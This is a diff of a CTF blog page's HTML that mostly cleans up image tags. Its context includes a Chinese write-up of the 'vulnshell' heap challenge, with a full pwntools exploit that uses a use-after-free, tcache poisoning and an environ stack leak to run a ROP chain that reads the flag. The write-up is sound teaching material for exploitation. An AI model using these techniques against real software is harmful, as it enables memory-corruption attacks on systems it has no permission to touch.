@@ -204,7 +204,7 @@
   </transition>
   <div class="drawer-box" :class="{'active': visible}">
     <div class="drawer-box-head bg-color">
-      <img class="drawer-box-head_logo lazyload placeholder" src="/medias/logo.png" class="lazyload placeholder" data-srcset="/medias/logo.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="logo">
+      <img class="drawer-box-head_logo" src="/medias/logo.png" alt="logo">
       <h3 class="drawer-box-head_title">ABf1ag&#39;s blog</h3>
       <h5 class="drawer-box-head_desc">CTF to learn,not learn to CTF</h5>
     </div>
@@ -342,7 +342,7 @@
     <div class="blog-title" id="author-avatar">
       
         <div class="avatar">
-          <img src="/medias/logo.png" class="lazyload placeholder" data-srcset="/medias/logo.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="logo">
+          <img src="/medias/logo.png" alt="logo">
         </div>
       
       <a href="/" class="logo">ABf1ag&#39;s blog</a>
@@ -604,7 +604,7 @@
 <h3 id="vulnshell"><a href="#vulnshell" class="headerlink" title="vulnshell"></a>vulnshell</h3><p>一道正常的堆题，当时决赛没有做出来，赛后多亏darry👴的提醒，让我茅塞顿开。</p>
 <p>其实对于有tcache存在的libc版本，将堆申请到栈上都是挺容易的，因为不需要对chunk的头做检查（libc-2.23只需要在栈上提前布置好chunk头就行）。因此，除了打free_hook和malloc_hook，我们也可以将堆申请到栈上来构造我们的rop然后执行。只不过我们需要先得到栈的地址，environ在其中起到很关键的作用。</p>
 <p>这个题漏洞点就在于cp操作中，复制了原来的chunk造成了两个指针指向同一个chunk，造成uaf漏洞。</p>
-<p><img src="/.io//ABf1ag-blog\source_posts\长城杯final\image-20211014170510192.png" class="lazyload placeholder" data-srcset="/.io//ABf1ag-blog\source_posts\长城杯final\image-20211014170510192.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20211014170510192"></p>
+<p><img src="https://img.le1a.com/2023/02/07/88f918b4acfd5.png" alt="image-20211014170510192"></p>
 <p>exp如下：</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">io=process(&#x27;./vuln&#x27;)</span><br><span class="line">elf=ELF(&#x27;./vuln&#x27;)</span><br><span class="line">libc=elf.libc</span><br><span class="line">context.log_level=&#x27;debug&#x27;</span><br><span class="line">context.arch=&#x27;amd64&#x27;</span><br><span class="line"></span><br><span class="line">def cmd(cmd):</span><br><span class="line">	io.sendlineafter(&#x27;root@Vshell# &#x27;,cmd)</span><br><span class="line"></span><br><span class="line">def exp():</span><br><span class="line">	cmd(&#x27;touch 0&#x27;)</span><br><span class="line">	cmd(&#x27;touch a&#x27;)</span><br><span class="line">	cmd(&#x27;vi 0&#x27;)</span><br><span class="line">	io.sendlineafter(&#x27;Data: &#x27;,&#x27;a&#x27;*0xf7)</span><br><span class="line">	cmd(&#x27;vi a&#x27;)</span><br><span class="line">	io.sendlineafter(&#x27;Data: &#x27;,&#x27;a&#x27;*0xf7)</span><br><span class="line">	cmd(&#x27;cp a b&#x27;)</span><br><span class="line">	cmd(&#x27;rm 0&#x27;)</span><br><span class="line">	cmd(&#x27;rm a&#x27;)</span><br><span class="line">	cmd(&#x27;cat b&#x27;)</span><br><span class="line">	heap_base=u64(io.recv(6).ljust(8,&#x27;\x00&#x27;))-0x310</span><br><span class="line">	print(&#x27;heap_base&#x27;,hex(heap_base))</span><br><span class="line">	#gdb.attach(io)</span><br><span class="line">	cmd(&#x27;vi b&#x27;)</span><br><span class="line">	io.sendlineafter(&#x27;Data: &#x27;,p64(heap_base))</span><br><span class="line">	cmd(&#x27;touch c&#x27;)</span><br><span class="line">	cmd(&#x27;vi c&#x27;)</span><br><span class="line">	io.sendlineafter(&#x27;Data: &#x27;,&#x27;a&#x27;*0xf7)</span><br><span class="line">	cmd(&#x27;touch d&#x27;)</span><br><span class="line">	cmd(&#x27;vi d&#x27;)</span><br><span class="line">	payload=&#x27;\x00&#x27;*2*9+&#x27;\x00\x00&#x27;</span><br><span class="line">	payload=payload.ljust(0xf0,&#x27;\x00&#x27;)</span><br><span class="line">	io.sendafter(&#x27;Data: &#x27;,payload)#tcache</span><br><span class="line">	cmd(&#x27;touch e&#x27;)</span><br><span class="line">	cmd(&#x27;touch g&#x27;)</span><br><span class="line">	cmd(&#x27;vi e&#x27;)</span><br><span class="line">	io.sendafter(&#x27;Data: &#x27;,&#x27;\x00&#x27;*0xa0)</span><br><span class="line">	cmd(&#x27;vi g&#x27;)</span><br><span class="line">	io.sendafter(&#x27;Data: &#x27;,&#x27;\x00&#x27;*0xa0)</span><br><span class="line">	cmd(&#x27;cp e f&#x27;)</span><br><span class="line">	cmd(&#x27;vi d&#x27;)</span><br><span class="line">	payload=&#x27;\x00&#x27;*2*11+&#x27;\x07\x00&#x27;</span><br><span class="line">	#payload=payload.ljust(0xf0,&#x27;\x00&#x27;)</span><br><span class="line">	io.sendafter(&#x27;Data: &#x27;,payload)#tcache</span><br><span class="line">	cmd(&#x27;rm f&#x27;)</span><br><span class="line">	cmd(&#x27;cat e&#x27;)</span><br><span class="line">	malloc_hook=u64(io.recvuntil(&#x27;\x7f&#x27;)[-6:].ljust(8,&#x27;\x00&#x27;))-96-16</span><br><span class="line">	libc_base=malloc_hook-libc.symbols[&#x27;__malloc_hook&#x27;]</span><br><span class="line">	print(&#x27;libc_base&#x27;,hex(libc_base))</span><br><span class="line">	system=libc_base+libc.symbols[&#x27;system&#x27;]</span><br><span class="line">	free_hook=libc_base+libc.symbols[&#x27;__free_hook&#x27;]</span><br><span class="line">	environ=libc_base+libc.symbols[&#x27;_environ&#x27;]</span><br><span class="line">	</span><br><span class="line">	cmd(&#x27;vi d&#x27;)</span><br><span class="line">	payload=&#x27;\x00&#x27;*2*11+&#x27;\x00\x00&#x27;</span><br><span class="line">	#payload=payload.ljust(0xf0,&#x27;\x00&#x27;)</span><br><span class="line">	io.sendafter(&#x27;Data: &#x27;,payload)#tcache</span><br><span class="line">	cmd(&#x27;cp g z&#x27;)</span><br><span class="line">	cmd(&#x27;rm g&#x27;)</span><br><span class="line">	cmd(&#x27;vi d&#x27;)</span><br><span class="line">	payload=&#x27;\x00&#x27;*2*11+&#x27;\x02\x00&#x27;</span><br><span class="line">	io.sendafter(&#x27;Data: &#x27;,payload)#tcache</span><br><span class="line">	cmd(&#x27;vi z&#x27;)</span><br><span class="line">	io.sendafter(&#x27;Data: &#x27;,p64(environ-0xa0)+&#x27;\x00&#x27;*0x98)</span><br><span class="line">	cmd(&#x27;touch g&#x27;)</span><br><span class="line">	cmd(&#x27;vi g&#x27;)</span><br><span class="line">	io.sendafter(&#x27;Data: &#x27;,&#x27;\x00&#x27;*0xa0)</span><br><span class="line">	cmd(&#x27;rm b&#x27;)</span><br><span class="line">	cmd(&#x27;touch 1&#x27;)</span><br><span class="line">	cmd(&#x27;vi 1&#x27;)</span><br><span class="line">	io.sendafter(&#x27;Data: &#x27;,&#x27;a&#x27;*0xa0)</span><br><span class="line">	cmd(&#x27;cat 1&#x27;)</span><br><span class="line">	stack=u64(io.recvuntil(&#x27;\x7f&#x27;)[-6:].ljust(8,&#x27;\x00&#x27;))</span><br><span class="line">	stack=stack-0x100</span><br><span class="line">	print(&#x27;stack&#x27;,hex(stack))</span><br><span class="line">	cmd(&#x27;rm g&#x27;)</span><br><span class="line">	cmd(&#x27;vi d&#x27;)</span><br><span class="line">	payload=&#x27;\x00&#x27;*2*11+&#x27;\x02\x00&#x27;</span><br><span class="line">	#payload=payload.ljust(0xf0,&#x27;\x00&#x27;)</span><br><span class="line">	io.sendafter(&#x27;Data: &#x27;,payload)#tcache</span><br><span class="line">	cmd(&#x27;vi z&#x27;)</span><br><span class="line">	io.sendafter(&#x27;Data: &#x27;,p64(stack)+&#x27;\x00&#x27;*0x98)</span><br><span class="line">	cmd(&#x27;touch g&#x27;)</span><br><span class="line">	cmd(&#x27;vi g&#x27;)</span><br><span class="line">	io.sendafter(&#x27;Data: &#x27;,&#x27;a&#x27;*0xa0)</span><br><span class="line">	cmd(&#x27;rm d&#x27;)</span><br><span class="line">	cmd(&#x27;touch 2&#x27;)</span><br><span class="line">	cmd(&#x27;vi 2&#x27;)</span><br><span class="line">	payload=[libc.search(asm(&#x27;pop rdi\nret&#x27;)).next()+libc_base,</span><br><span class="line">		stack+0x80,</span><br><span class="line">		libc.search(asm(&#x27;pop rsi\nret&#x27;)).next()+libc_base,</span><br><span class="line">		0,</span><br><span class="line">		libc.symbols[&#x27;open&#x27;]+libc_base,</span><br><span class="line">		libc.search(asm(&#x27;pop rdi\nret&#x27;)).next()+libc_base,</span><br><span class="line">		3,</span><br><span class="line">		libc.search(asm(&#x27;pop rsi\nret&#x27;)).next()+libc_base,</span><br><span class="line">		stack+0x80,</span><br><span class="line">		0x000000000011c371+libc_base,</span><br><span class="line">		0x30,</span><br><span class="line">		0,</span><br><span class="line">		libc.symbols[&#x27;read&#x27;]+libc_base,</span><br><span class="line">		libc.search(asm(&#x27;pop rdi\nret&#x27;)).next()+libc_base,</span><br><span class="line">		1,</span><br><span class="line">		libc.symbols[&#x27;write&#x27;]+libc_base,</span><br><span class="line">		&#x27;./flag\x00\x00&#x27;,</span><br><span class="line">		0,</span><br><span class="line">		0,</span><br><span class="line">		0]</span><br><span class="line">	</span><br><span class="line">	io.sendafter(&#x27;Data: &#x27;,flat(payload))</span><br><span class="line">	cmd(&#x27;exit&#x27;)</span><br><span class="line">	io.interactive()</span><br><span class="line">exp()</span><br></pre></td></tr></table></figure>
 
@@ -643,7 +643,7 @@
   <div class="post-nav-prev post-nav-item">
     <div class="post-nav-img" style="background-size: cover; 
       background-position: center center;">
-      <img class="lazyload lazyload placeholder" src="/medias/6.jpg" class="lazyload placeholder" data-srcset="/medias/6.jpg" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="">
+      <img class="lazyload" src="/medias/6.jpg" alt="">
     </div>
     <a href="/2021/10/18/xi-you-di-er-jie-xiao-sai/" class="post-nav-link">
       <div class="title">
@@ -667,7 +667,7 @@
   <div class="post-nav-next post-nav-item">
     <div class="post-nav-img" style="background-size: cover; 
       background-position: center center;">
-      <img class="lazyload lazyload placeholder" src="/medias/11.jpg" class="lazyload placeholder" data-srcset="/medias/11.jpg" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" src="" alt="">
+      <img class="lazyload" src="/medias/11.jpg" src="" alt="">
     </div>
     <a href="/2021/10/01/tcache-stashing-unlink-attack-xue-xi-bi-ji/" class="post-nav-link">
       <div class="title">
@@ -722,10 +722,10 @@
       </div>
       <div class="donate-box_img">
         <div class="AlipayImg" v-show="tabActive === 'Alipay'">
-          <img src="/medias/1.jpg" class="lazyload placeholder" data-srcset="/medias/1.jpg" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="支付宝打赏" />
+          <img src="/medias/1.jpg" alt="支付宝打赏" />
         </div> 
         <div class="WeChatpayImg" v-show="tabActive === 'WeChatpay'">
-          <img src="/medias/2.jpg" class="lazyload placeholder" data-srcset="/medias/2.jpg" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="微信打赏" />
+          <img src="/medias/2.jpg" alt="微信打赏" />
         </div>
       </div>
     </div>
@@ -936,7 +936,7 @@
             <div class="post-img-box">
               <a href="/2099/06/11/ri-zhi/" class="post-img " style="background-size: cover; 
                 background-position: center center;">
-                <img class="lazyload lazyload placeholder" style="width:100%;height:100%;object-fit:cover;" data-src="/medias/11.jpg" class="lazyload placeholder" data-srcset="/medias/11.jpg" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="">
+                <img class="lazyload" style="width:100%;height:100%;object-fit:cover;" data-src="/medias/11.jpg" alt="">
               </a>
             </div>
             <div class="post-date-title">
@@ -957,7 +957,7 @@
             <div class="post-img-box">
               <a href="/2023/01/18/kernel-chu-tan/" class="post-img " style="background-size: cover; 
                 background-position: center center;">
-                <img class="lazyload lazyload placeholder" style="width:100%;height:100%;object-fit:cover;" data-src="/medias/7.jpg" class="lazyload placeholder" data-srcset="/medias/7.jpg" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="">
+                <img class="lazyload" style="width:100%;height:100%;object-fit:cover;" data-src="/medias/7.jpg" alt="">
               </a>
             </div>
             <div class="post-date-title">
@@ -978,7 +978,7 @@
             <div class="post-img-box">
               <a href="/2023/01/06/llvmpass-chu-tan/" class="post-img " style="background-size: cover; 
                 background-position: center center;">
-                <img class="lazyload lazyload placeholder" style="width:100%;height:100%;object-fit:cover;" data-src="/medias/1.jpg" class="lazyload placeholder" data-srcset="/medias/1.jpg" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="">
+                <img class="lazyload" style="width:100%;height:100%;object-fit:cover;" data-src="/medias/1.jpg" alt="">
               </a>
             </div>
             <div class="post-date-title">
@@ -999,7 +999,7 @@
             <div class="post-img-box">
               <a href="/2022/12/30/nian-zhong-zong-jie-2022/" class="post-img " style="background-size: cover; 
                 background-position: center center;">
-                <img class="lazyload lazyload placeholder" style="width:100%;height:100%;object-fit:cover;" data-src="/medias/15.jpg" class="lazyload placeholder" data-srcset="/medias/15.jpg" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="">
+                <img class="lazyload" style="width:100%;height:100%;object-fit:cover;" data-src="/medias/15.jpg" alt="">
               </a>
             </div>
             <div class="post-date-title">
@@ -1020,7 +1020,7 @@
             <div class="post-img-box">
               <a href="/2022/01/19/yi-gou-pwn-xue-xi-ji-lu/" class="post-img " style="background-size: cover; 
                 background-position: center center;">
-                <img class="lazyload lazyload placeholder" style="width:100%;height:100%;object-fit:cover;" data-src="/medias/11.jpg" class="lazyload placeholder" data-srcset="/medias/11.jpg" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="">
+                <img class="lazyload" style="width:100%;height:100%;object-fit:cover;" data-src="/medias/11.jpg" alt="">
               </a>
             </div>
             <div class="post-date-title">
